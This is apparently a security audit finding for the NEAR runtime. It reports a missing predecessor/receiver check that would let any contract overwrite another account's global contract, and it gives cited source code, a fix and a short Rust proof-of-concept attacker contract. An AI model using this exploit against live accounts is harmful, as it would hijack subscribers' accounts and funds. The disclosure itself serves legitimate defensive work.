### Title
Missing `predecessor_id == receiver_id` Guard in `action_deploy_global_contract` Allows Any Contract to Overwrite Another Account's Global Contract — (`runtime/runtime/src/global_contracts.rs`)

### Summary

`DeployGlobalContractAction` in `AccountId` mode stores the deployed code under the receipt receiver's account ID as the global-contract namespace key. Unlike `DeployContract`, `Stake`, `AddKey`, `DeleteKey`, and `DeleteAccount`, there is no `predecessor_id == receiver_id` guard on this action. A malicious contract can therefore create a cross-contract promise to any victim account, append `DeployGlobalContractByAccountId`, and overwrite the victim's global contract. Every account that has called `UseGlobalContract(AccountId(victim))` will subsequently execute the attacker's code.

### Finding Description

`GlobalContractDeployMode::AccountId` stores the contract under `TrieKey::GlobalContractCode { identifier: GlobalContractCodeIdentifier::AccountId(receiver_id) }`. The execution entry point is:

```rust
// runtime/runtime/src/global_contracts.rs L23-61
pub(crate) fn action_deploy_global_contract(
    state_update: &mut TrieUpdate,
    account: &mut Account,
    account_id: &AccountId,          // ← receipt receiver_id
    apply_state: &ApplyState,
    deploy_contract: &DeployGlobalContractAction,
    result: &mut ActionResult,
) -> Result<(), RuntimeError> {
    ...
    initiate_distribution(
        state_update,
        account_id.clone(),          // ← used as the namespace key
        deploy_contract.code.clone(),
        &deploy_contract.deploy_mode,
        ...
    )?;
```

Inside `initiate_distribution`, when `deploy_mode == AccountId`:

```rust
// runtime/runtime/src/global_contracts.rs L149-156
let id = match deploy_mode {
    GlobalContractDeployMode::CodeHash => {
        GlobalContractIdentifier::CodeHash(hash(&contract_code))
    }
    GlobalContractDeployMode::AccountId => {
        GlobalContractIdentifier::AccountId(account_id.clone())  // ← receiver_id
    }
};
```

Neither `action_deploy_global_contract` nor the action validator checks that `predecessor_id == receiver_id`. The protocol documentation explicitly lists the actions that carry this guard (`DeployContract`, `Stake`, `AddKey`, `DeleteKey`, `DeleteAccount`); `DeployGlobalContract` is absent from that list.

The host function that contracts use to emit this action also imposes no self-receipt constraint:

```rust
// runtime/near-vm-runner/src/logic/logic.rs L2558-2570
pub fn promise_batch_action_deploy_global_contract_by_account_id(
    &mut self,
    promise_idx: u64,   // ← can be any cross-contract promise
    code_len: u64,
    code_ptr: u64,
) -> Result<()> {
    self.promise_batch_action_deploy_global_contract_impl(
        promise_idx, code_len, code_ptr,
        GlobalContractDeployMode::AccountId,
        ...
    )
}
```

`promise_idx_to_receipt_idx_with_sir` returns a `sir` (self-is-receiver) flag used only for gas pricing; it does not gate the action.

### Impact Explanation

An attacker who controls any deployed contract can:

1. Call `promise_batch_create("victim.near")` to create a cross-contract promise.
2. Call `promise_batch_action_deploy_global_contract_by_account_id(promise_idx, malicious_wasm)`.
3. The runtime executes the action on `victim.near`'s shard, writing the attacker's WASM to `TrieKey::GlobalContractCode { identifier: AccountId("victim.near") }`.
4. Every account that previously called `UseGlobalContract(AccountId("victim.near"))` now executes the attacker's code on the next function call.

The attacker's code runs with the full privileges of each victim user account (balance transfers, key management, cross-contract calls). The corrupted value is the WASM blob stored at `TrieKey::GlobalContractCode { identifier: AccountId("victim.near") }` and the `AccountContract::GlobalByAccount("victim.near")` pointer stored in every subscriber's account state.

### Likelihood Explanation

The attack requires only a deployed contract and the `global_contract_host_fns` protocol feature to be active. No privileged keys, no validator access, and no special permissions are needed. The `AccountId`-mode global contract is explicitly designed for mutable, owner-updatable shared libraries; any ecosystem contract that relies on this mutability model is a viable target. The attack is a single cross-contract call.

### Recommendation

Add a `predecessor_id == receiver_id` check in `action_deploy_global_contract` for `AccountId` mode, mirroring the guard applied to `DeployContract`:

```rust
if deploy_contract.deploy_mode == GlobalContractDeployMode::AccountId
    && predecessor_id != account_id
{
    result.result = Err(ActionErrorKind::ActorNoPermission {
        account_id: account_id.clone(),
        actor_id: predecessor_id.clone(),
    }.into());
    return Ok(());
}
```

Alternatively, enforce this at the action-validation layer in `validate_action_with_mode` so the check applies to both transaction-level and receipt-level paths.

### Proof of Concept

```rust
// Attacker's contract (deployed on attacker.near)
#[near_bindgen]
impl Attacker {
    pub fn overwrite_victim_global_contract(&self) {
        let malicious_wasm: Vec<u8> = include_bytes!("malicious.wasm").to_vec();
        // Create a cross-contract promise to victim.near
        let promise = env::promise_batch_create("victim.near");
        // Append DeployGlobalContractByAccountId — no self-receipt check
        env::promise_batch_action_deploy_global_contract_by_account_id(
            promise,
            malicious_wasm,
        );
    }
}
```

After this receipt executes:
- `TrieKey::GlobalContractCode { identifier: AccountId("victim.near") }` → attacker's WASM
- Every account with `AccountContract::GlobalByAccount("victim.near")` now runs attacker code on the next function call, with full access to that account's balance and keys. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** runtime/runtime/src/global_contracts.rs (L23-61)
```rust
pub(crate) fn action_deploy_global_contract(
    state_update: &mut TrieUpdate,
    account: &mut Account,
    account_id: &AccountId,
    apply_state: &ApplyState,
    deploy_contract: &DeployGlobalContractAction,
    result: &mut ActionResult,
) -> Result<(), RuntimeError> {
    let _span = tracing::debug_span!(target: "runtime", "action_deploy_global_contract").entered();

    let storage_cost = apply_state
        .config
        .fees
        .storage_usage_config
        .global_contract_storage_amount_per_byte
        .saturating_mul(deploy_contract.code.len() as u128);
    let Some(updated_balance) = account.amount().checked_sub(storage_cost) else {
        result.result = Err(ActionErrorKind::LackBalanceForState {
            account_id: account_id.clone(),
            amount: storage_cost,
        }
        .into());
        return Ok(());
    };
    result.tokens_burnt =
        result.tokens_burnt.checked_add(storage_cost).ok_or(IntegerOverflowError)?;
    account.set_amount(updated_balance);

    initiate_distribution(
        state_update,
        account_id.clone(),
        deploy_contract.code.clone(),
        &deploy_contract.deploy_mode,
        apply_state.shard_id,
        result,
    )?;

    Ok(())
}
```

**File:** runtime/runtime/src/global_contracts.rs (L141-169)
```rust
fn initiate_distribution(
    state_update: &mut TrieUpdate,
    account_id: AccountId,
    contract_code: Arc<[u8]>,
    deploy_mode: &GlobalContractDeployMode,
    current_shard_id: ShardId,
    result: &mut ActionResult,
) -> Result<(), RuntimeError> {
    let id = match deploy_mode {
        GlobalContractDeployMode::CodeHash => {
            GlobalContractIdentifier::CodeHash(hash(&contract_code))
        }
        GlobalContractDeployMode::AccountId => {
            GlobalContractIdentifier::AccountId(account_id.clone())
        }
    };
    // Increment the nonce and write it to state immediately to prevent multiple
    // distributions with the same nonce from being initiated. This requires
    // allowing the same nonce in the freshness check when applying the
    // distribution receipt.
    let nonce = increment_nonce(state_update, &id)?;
    let distribution_receipt =
        GlobalContractDistributionReceipt::new(id, current_shard_id, vec![], contract_code, nonce);
    let distribution_receipts =
        Receipt::new_global_contract_distribution(account_id, distribution_receipt);
    // No need to set receipt_id here, it will be generated as part of apply_action_receipt
    result.new_receipts.push(distribution_receipts);
    Ok(())
}
```

**File:** runtime/near-vm-runner/src/logic/logic.rs (L2558-2600)
```rust
    pub fn promise_batch_action_deploy_global_contract_by_account_id(
        &mut self,
        promise_idx: u64,
        code_len: u64,
        code_ptr: u64,
    ) -> Result<()> {
        self.promise_batch_action_deploy_global_contract_impl(
            promise_idx,
            code_len,
            code_ptr,
            GlobalContractDeployMode::AccountId,
            "promise_batch_action_deploy_global_contract_by_account_id",
        )
    }

    fn promise_batch_action_deploy_global_contract_impl(
        &mut self,
        promise_idx: u64,
        code_len: u64,
        code_ptr: u64,
        mode: GlobalContractDeployMode,
        method_name: &str,
    ) -> Result<()> {
        self.result_state.gas_counter.pay_base(base)?;
        if self.context.is_view() {
            return Err(HostError::ProhibitedInView { method_name: method_name.to_owned() }.into());
        }
        let code = get_memory_or_register!(self, code_ptr, code_len)?;
        let code_len = code.len() as u64;
        let limit = self.config.limit_config.max_contract_size;
        if code_len > limit {
            return Err(HostError::ContractSizeExceeded { size: code_len, limit }.into());
        }
        let code = code.into_owned();

        let (receipt_idx, sir) = self.promise_idx_to_receipt_idx_with_sir(promise_idx)?;

        self.pay_action_base(ActionCosts::deploy_global_contract_base, sir)?;
        self.pay_action_per_byte(ActionCosts::deploy_global_contract_byte, code_len, sir)?;

        self.ext.append_action_deploy_global_contract(receipt_idx, code, mode);
        Ok(())
    }
```

**File:** core/primitives/src/action/mod.rs (L133-142)
```rust
pub enum GlobalContractDeployMode {
    /// Contract is deployed under its code hash.
    /// Users will be able reference it by that hash.
    /// This effectively makes the contract immutable.
    CodeHash,
    /// Contract is deployed under the owner account id.
    /// Users will be able reference it by that account id.
    /// This allows the owner to update the contract for all its users.
    AccountId,
}
```

**File:** docs/RuntimeSpec/Actions.md (L26-35)
```markdown
For the following actions, `predecessor_id` and `receiver_id` are required to be equal:

- `DeployContract`
- `Stake`
- `AddKey`
- `DeleteKey`
- `DeleteAccount`

NOTE: if the first action in the action list is `CreateAccount`, `predecessor_id` becomes `receiver_id`
for the rest of the actions until `DeleteAccount`. This gives permission by another account to act on the newly created account.
```
